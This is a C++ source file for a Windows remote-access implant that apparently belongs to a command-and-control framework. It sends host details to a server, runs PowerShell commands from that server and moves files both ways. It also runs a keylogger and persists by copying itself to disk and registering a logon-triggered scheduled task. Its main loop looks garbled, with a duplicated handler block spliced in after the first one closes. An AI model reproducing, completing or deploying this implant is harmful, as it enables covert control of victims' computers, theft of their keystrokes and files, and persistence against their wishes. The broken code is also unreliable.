#define WIN32_LEAN_AND_MEAN
#define WINVER 0x0600
#define _WIN32_WINNT 0x0600

#include "Agent.h"
#include "base64.hpp"

#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <psapi.h>

#include <winternl.h>
#include <initguid.h>
#include <ole2.h>
#include <mstask.h>
#include <msterr.h>
#include <objidl.h>
#include <wchar.h>
#include <ocidl.h>
#include <taskschd.h>
#include <sstream>
#include <random>
#include <cctype> 
#include <iostream>
#include <shlwapi.h>
#include <comdef.h>
#include "shlobj.h"

#include <memory>
#include <array>
#include <cmath>
#include <cstdio>
#include <filesystem>
#include <fstream>
#include <variant>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment (lib, "ole32")
#pragma comment(lib,"shlwapi.lib")

template <class... Ts>
struct overloaded : Ts...
{
    using Ts::operator()...;
};
template <class... Ts>
overloaded(Ts...) -> overloaded<Ts...>;

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Default constructor
Agent::Agent(CommManager commManager, TaskQueueManager taskManager)
{
    this->commManager = commManager;
    this->taskManager = taskManager;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//

void Agent::Start()
{
    // Perform the initial check-in and send host information to the communication manager.
    commManager.IntialCheckin(GetHostInformation().StructToJson());

    // Continuously check for new tasks and process pending tasks.
    while (true)
    {
        // Check in with the server, including any available task results,
        // and queue any new task returned by the server.
        std::string newTask = commManager.Checkin(taskManager.GetTaskResults());
        taskManager.QueueTask(newTask);

        if (!taskManager.HasPendingResult())
        {
            auto request = commManager.Checkin(taskManager.GetTaskResults());
            taskManager.QueueTask(request);
        }
        else
        {
            std::string newTask = commManager.Checkin(taskManager.GetTaskResults());

            taskManager.QueueTask(newTask);
        }

        // Only process a task if one is waiting in the task queue.
        if (taskManager.HasPendingTask())
        {
            // Retrieve the next task from the queue.
            auto request = taskManager.GetNextTask();

            Response result = std::visit(overloaded{
                [this](const TaskRequest<CommandPowershell>& psRequest) -> Response {
                    return this->ExecutePowerShell(psRequest.taskID, psRequest.data);
                },
                [this](const TaskRequest<CommandWinTask>& winTaskRequest) -> Response {
                    return this->CreateWindowsTaskW(winTaskRequest.taskID, winTaskRequest.data);
                },
                [](const auto& unhandledRequest) -> Response {
                    return TaskResponse<TaskSuccess>{ };
                }
            }, request);

                    // Handle file upload requests.
                    [this](const TaskRequest<CommandUploadFile> &uploadRequest) -> Response
                    {
                        return this->UploadFile(
                            uploadRequest.taskID,
                            uploadRequest.data);
                    },

                    // Handle file download requests.
                    [this](const TaskRequest<CommandDownloadFile> &downloadRequest) -> Response
                    {
                        return this->DownloadFile(
                            downloadRequest.taskID,
                            downloadRequest.data);
                    },

                    // Handle keylogger start requests.
                    [this](const TaskRequest<Keylogger> &keyloggerStartRequest) -> Response
                    {
                        Keylogger keylogger;
                        return this->keylogger.keylog_start(keyloggerStartRequest.taskID, keyloggerStartRequest.data);
                    },

                    // Handle keylogger stop requests.
                    [this](const TaskRequest<Keylogger> &keyloggerStopRequest) -> Response
                    {
                        Keylogger keylogger;
                        return this->keylogger.get_keylog_data(keyloggerStopRequest.taskID, keyloggerStopRequest.data);
                    },

                    // Return an error response for explicitly unsupported Boolean tasks.
                    [](const TaskRequest<bool> &) -> Response
                    {
                        return CreateTaskResponse(
                            0,
                            NO_CODE,
                            NO_CODE,
                            TASK_ERROR,
                            TaskError{1, "Unsupported task."});
                    },

                    // Provide a default response for any other unhandled request type.
                    [](const auto &) -> Response
                    {
                        return TaskResponse<TaskSuccess>{};
                    }},
                request);

            // Store the response so it can be included in a subsequent check-in.
            taskManager.StoreTaskResult(result);
        }

        // Pause for five seconds before checking in again.
        Sleep(5000);
    }
}

typedef struct _LDR_DATA_TABLE_ENTRY2 {
    LIST_ENTRY InMemoryOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
    PVOID EntryPoint;
    PVOID Reserved3;
    UNICODE_STRING FullDllName;
    BYTE Reserved4[8];
    PVOID Reserved5[3];
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    };
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY2, * PLDR_DATA_TABLE_ENTRY2;


LPCWSTR GetLocalModule() {
    PPEB                   pPeb = NULL;
    PPEB_LDR_DATA          pLdrData = NULL;
    PLDR_DATA_TABLE_ENTRY2 pDataTableEntry = NULL;

    pPeb = (PEB*)(__readgsqword(0x60));
    pLdrData = (PPEB_LDR_DATA)(pPeb->Ldr);
    pDataTableEntry = (PLDR_DATA_TABLE_ENTRY2)(pLdrData->InMemoryOrderModuleList.Flink);

    return (LPCWSTR)pDataTableEntry->FullDllName.Buffer;
}

BOOL DropFileToDiskW(const std::wstring& path) {
    HRESULT hr = E_FAIL;
    HANDLE  hFile = INVALID_HANDLE_VALUE;
    HANDLE  hDropFile = INVALID_HANDLE_VALUE;
    LPCWSTR pModule = NULL;
    DWORD   dwFileSize = NULL;
    DWORD   dwNumberOfBytesRead = NULL;
    DWORD   dwNumberOfBytesWritten = NULL;
    DWORD   dwPathLenBytes = NULL;
    LPVOID  pBaseAddress = NULL;
    BOOL    isSuccess = FALSE;

    pModule = GetLocalModule();
    hFile = CreateFileW(pModule, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) goto e_func;

    dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE) goto e_func;

    pBaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
    if (!pBaseAddress) goto e_func;

    isSuccess = ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL);
    if (!isSuccess) goto e_func;

    hDropFile = CreateFileW(path.c_str(), GENERIC_READ | GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    isSuccess = WriteFile(hDropFile, pBaseAddress, dwFileSize, &dwNumberOfBytesWritten, NULL);
    if (!isSuccess) goto e_func;

e_func:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hDropFile != INVALID_HANDLE_VALUE) CloseHandle(hDropFile);
    if (pBaseAddress) HeapFree(GetProcessHeap(), 0, pBaseAddress);
    return isSuccess;
}


Response Agent::CreateWindowsTaskW(const int& taskID, const CommandWinTask& request){
    HRESULT         hr = E_FAIL;
    BOOL            isSuccess = FALSE;
    ITask* pITask = NULL;
    IPersistFile* pIPersistFile = NULL;
    ITaskTrigger* pITaskTrigger = NULL;
    ITaskFolder* pITaskFolder = NULL;
    std::wstring    uuid = {};
    std::wstring    wPath = {};
    ITaskScheduler* pITS = 0;
    WORD            piNewTrigger = 0;
    DWORD           dwFlags = 0;
    TASK_TRIGGER    pTrigger;
    IEnumWorkItems* pEnumWorkItems = NULL;
    LPWSTR          userName = NULL;

    std::wstring path(request.path.begin(), request.path.end());
    std::wstring username(request.username.begin(), request.username.end());
    std::wstring workItemName(request.taskName.begin(), request.taskName.end());

    isSuccess = DropFileToDiskW(path);
    if (!isSuccess) goto e_func;

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) goto e_func;

    hr = CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (void**)&pITS);
    if (FAILED(hr)) goto e_func;

    hr = pITS->NewWorkItem(workItemName.c_str(), CLSID_CTask, IID_ITask, (IUnknown**)&pITask);
    if (FAILED(hr)) goto e_func;

    hr = pITask->SetApplicationName(path.c_str());
    if (FAILED(hr)) goto e_func;

    hr = pITask->SetAccountInformation(username.c_str(), NULL);
    if (FAILED(hr)) goto e_func;

    hr = pITask->CreateTrigger(&piNewTrigger, &pITaskTrigger);
    if (FAILED(hr)) goto e_func;

    ZeroMemory(&pTrigger, sizeof(TASK_TRIGGER));
    pTrigger.cbTriggerSize = sizeof(TASK_TRIGGER);
    pTrigger.wBeginDay = 1;
    pTrigger.wBeginMonth = 1;
    pTrigger.wBeginYear = 1999;
    pTrigger.TriggerType = TASK_EVENT_TRIGGER_AT_LOGON;

    hr = pITaskTrigger->SetTrigger(&pTrigger);
    if (FAILED(hr)) goto e_func;

    hr = pITask->GetFlags(&dwFlags);
    if (FAILED(hr)) goto e_func;

    dwFlags |= TASK_FLAG_RUN_ONLY_IF_LOGGED_ON;
    hr = pITask->SetFlags(dwFlags);
    if (FAILED(hr)) goto e_func;

    hr = pITask->QueryInterface(IID_IPersistFile, (void**)&pIPersistFile);
    hr = pIPersistFile->Save(NULL, TRUE);
    if (FAILED(hr)) goto e_clean;

    pITask->Run();
    goto e_func;

e_clean:
    pITS->Delete(workItemName.c_str());
e_func:
    if (pITask) pITask->Release();
    if (pITaskTrigger) pITaskTrigger->Release();
    if (pIPersistFile) pIPersistFile->Release();
    if (pITaskFolder) pITaskFolder->Release();
    CoUninitialize();

    if (FAILED(hr))
    {
        _com_error err(hr);
        return CreateTaskResponse(taskID, WIN_TASK, NO_CODE, TASK_ERROR, TaskError{ hr, err.ErrorMessage() });
    }

    return CreateTaskResponse(taskID, WIN_TASK, NO_CODE, SUCCESS, TaskSuccess{"Successfully persisted via windows task"});
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//

// Agent default commands
void Agent::Exit()
{
    ExitProcess(0);
}

Response Agent::GetUID(const int &taskID, const bool &isTrue)
{
    char username[256];
    DWORD username_len = sizeof(username);
    // Get the username of the current user
    GetUserNameA(username, &username_len);

    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{username});
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
Response Agent::ExecutePowerShell(const int &taskID, const CommandPowershell &psRequest)
{
    std::string result;
    std::string psCommand = "powershell.exe -Command \"" + psRequest.commandlet + "\"";
    FILE *pipe = _popen(psCommand.c_str(), "r");
    if (!pipe)
    {
        return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskError{0, "Failed to open process pipe."});
    }

    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
    {
        result += buffer;
    }

    _pclose(pipe);

    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{result});
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Helpers
std::string ConvertLPWSTRToStdString(LPWSTR lpwstr)
{
    if (!lpwstr)
        return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, NULL, 0, NULL, NULL);

    if (size <= 0)
        return "";
    std::string result(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, &result[0], size, NULL, NULL);

    return result;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string Agent::CaptureCommandOutput(const std::string &cmd)
{
    std::array<char, 128> buffer;
    std::string result;

    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != NULL)
    {
        result += buffer.data();
    }

    if (!result.empty())
    {
        result.erase(result.find_last_not_of(" \n\r\t") + 1);
    }
    return result;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Host metadata commands
std::string Agent::GetMotherBoard()
{
    std::string cmd = "powershell -Command \"(Get-CimInstance Win32_BaseBoard).Product\"";
    std::string name = CaptureCommandOutput(cmd);
    return name;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
BOOL Agent::GetUsername(OUT LPWSTR *szWhoamiStr)
{
    DWORD dwSize = 0x00;
    BOOL bResult = FALSE;

    if (!GetUserNameW(NULL, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
    {
        std::cout << "[x] GetUserNameW [%d] Failed With Error: %d \n", __LINE__, GetLastError();
        goto _END_OF_FUNC;
    }

    if (!(*szWhoamiStr = (LPWSTR)LocalAlloc(LPTR, dwSize * sizeof(WCHAR))))
    {
        std::cout << "[x] LocalAlloc Failed With Error: %d \n", GetLastError();
        goto _END_OF_FUNC;
    }

    if (!GetUserNameW(*szWhoamiStr, &dwSize))
    {
        std::cout << "[x] GetUserNameW Failed With Error: %d \n", __LINE__, GetLastError();
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (!bResult && *szWhoamiStr)
    {
        LocalFree(*szWhoamiStr);
    }
    return bResult;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string Agent::GetInternalIP()
{
    ULONG outBufLen = 15000;
    std::vector<BYTE> buffer(outBufLen);
    PIP_ADAPTER_ADDRESSES pAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());

    // Retrieve network adapter configurations
    DWORD dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);

    if (dwRetVal == ERROR_BUFFER_OVERFLOW)
    {
        buffer.resize(outBufLen);
        pAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
        dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
    }

    if (dwRetVal == NO_ERROR)
    {
        while (pAddresses)
        {
            // Ignore loopback and inactive interfaces
            if (pAddresses->IfType != IF_TYPE_SOFTWARE_LOOPBACK && pAddresses->OperStatus == IfOperStatusUp)
            {
                PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pAddresses->FirstUnicastAddress;
                while (pUnicast)
                {
                    if (pUnicast->Address.lpSockaddr->sa_family == AF_INET)
                    {
                        sockaddr_in *sa_in = reinterpret_cast<sockaddr_in *>(pUnicast->Address.lpSockaddr);

                        int b1 = sa_in->sin_addr.S_un.S_un_b.s_b1;
                        int b2 = sa_in->sin_addr.S_un.S_un_b.s_b2;
                        int b3 = sa_in->sin_addr.S_un.S_un_b.s_b3;
                        int b4 = sa_in->sin_addr.S_un.S_un_b.s_b4;

                        char ipBuffer[16];
                        sprintf_s(ipBuffer, "%d.%d.%d.%d", b1, b2, b3, b4);
                        return std::string(ipBuffer);
                    }
                    pUnicast = pUnicast->Next;
                }
            }
            pAddresses = pAddresses->Next;
        }
    }
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string Agent::GetExternalViaDNS()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return "";

    struct addrinfo hints, *result = NULL;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    DWORD dwRetval = getaddrinfo("www.google.com", NULL, &hints, &result);
    if (dwRetval == 0)
    {
        struct sockaddr_in *sockaddr_ipv4 = (struct sockaddr_in *)result->ai_addr;
        char ipStr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ipStr, INET_ADDRSTRLEN);
        return ipStr;
        freeaddrinfo(result);
    }
    else
    {
        std::cerr << "DNS Query Failed." << std::endl;
    }
    WSACleanup();
    return "";
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string Agent::GetMachineMacAddress()
{
    ULONG bufferSize = 15000;
    std::vector<BYTE> buffer(bufferSize);

    ULONG flags = GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST;
    PIP_ADAPTER_ADDRESSES adapterList = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());

    ULONG result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, adapterList, &bufferSize);

    if (result == ERROR_BUFFER_OVERFLOW)
    {
        buffer.resize(bufferSize);
        adapterList = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
        result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, adapterList, &bufferSize);
    }

    if (result == NO_ERROR)
    {
        for (PIP_ADAPTER_ADDRESSES adapter = adapterList; adapter != NULL; adapter = adapter->Next)
        {
            if (adapter->OperStatus == IfOperStatusUp && adapter->PhysicalAddressLength == 6)
            {
                char macBuffer[18];
                snprintf(macBuffer, sizeof(macBuffer), "%02X:%02X:%02X:%02X:%02X:%02X",
                         adapter->PhysicalAddress[0], adapter->PhysicalAddress[1],
                         adapter->PhysicalAddress[2], adapter->PhysicalAddress[3],
                         adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);

                return std::string(macBuffer);
            }
        }
    }

    return "";
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string Agent::GetProcessName()
{
    HANDLE hProcess = GetCurrentProcess();
    char buffer[MAX_PATH];

    DWORD size = GetModuleBaseNameA(hProcess, NULL, buffer, MAX_PATH);
    return std::string(buffer, size);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
int Agent::GetPID()
{
    HANDLE hProcess = GetCurrentProcess();
    return GetProcessId(hProcess);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
int Agent::GetOSVersion()
{
    PBYTE pSharedUserData = (PBYTE)0X7FFE0000;
    return *(ULONG *)(pSharedUserData + 0x26C);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
int Agent::GetRAM()
{
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);

    if (GlobalMemoryStatusEx(&memInfo))
    {
        double totalRamBytes = static_cast<double>(memInfo.ullTotalPhys);
        double totalRamGB = totalRamBytes / (1024.0 * 1024.0 * 1024.0);
        return static_cast<int>(std::round(totalRamGB));
    }

    return 0;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
void Agent::GetTotalDiskSize(OUT double *total, OUT double *free)
{
    ULARGE_INTEGER freeBytesAvailableToCaller;
    ULARGE_INTEGER totalNumberOfBytes;
    ULARGE_INTEGER totalNumberOfFreeBytes;

    std::string cDrive = "C:\\";

    if (GetDiskFreeSpaceEx(cDrive.c_str(), &freeBytesAvailableToCaller, &totalNumberOfBytes, &totalNumberOfFreeBytes))
    {
        *total = std::round(static_cast<double>(totalNumberOfBytes.QuadPart) / (1024.0 * 1024.0 * 1024.0));
        *free = std::round(static_cast<double>(totalNumberOfFreeBytes.QuadPart) / (1024.0 * 1024.0 * 1024.0));
    }
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
int Agent::GetCpuCount()
{
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    return static_cast<int>(sysInfo.dwNumberOfProcessors);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
IntitalCheckinRequest Agent::GetHostInformation()
{
    std::string internalIP;
    std::string externalIP;
    std::string OS;
    double free, total;
    LPWSTR username;
    std::string processName;
    int pid;

    GetUsername(&username);
    GetTotalDiskSize(&total, &free);

    return IntitalCheckinRequest{
        GetInternalIP(),
        GetExternalViaDNS(),
        "Windows " + std::to_string(GetOSVersion()),
        ConvertLPWSTRToStdString(username),
        GetProcessName(),
        GetPID(),
        "High", // TODO Integrity
        GetMachineMacAddress(),
        GetMotherBoard(),
        GetRAM(),
        total,
        free,
        GetCpuCount()};
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// File Transfer Commands
Response Agent::UploadFile(const int &taskID, const CommandUploadFile &uploadRequest)
{
    const bool sent = commManager.SendFile(uploadRequest.path);
    if (sent)
        return CreateTaskResponse(taskID, UPLOAD, NO_CODE, SUCCESS,
                                  TaskSuccess{"File uploaded successfully."});
    return CreateTaskResponse(taskID, UPLOAD, NO_CODE, TASK_ERROR,
                              TaskError{1, "File upload failed."});
}

Response Agent::DownloadFile(const int &taskID, const CommandDownloadFile &downloadRequest)
{
    const auto directory = std::filesystem::path("files");
    std::filesystem::create_directories(directory);
    const auto path = directory / std::filesystem::path(downloadRequest.path).filename();
    const auto bytes = base64::from_base64(downloadRequest.data);
    std::ofstream output(path, downloadRequest.offset == 0
                                   ? std::ios::binary
                                   : std::ios::binary | std::ios::app);
    output.write(bytes.data(), static_cast<std::streamsize>(bytes.size()));
    if (output)
        return CreateTaskResponse(taskID, DOWNLOAD_2, DOWNLOAD, SUCCESS,
                                  TaskSuccess{"File chunk stored."});
    return CreateTaskResponse(taskID, DOWNLOAD_2, DOWNLOAD, TASK_ERROR,
                              TaskError{1, "File chunk could not be stored."});
}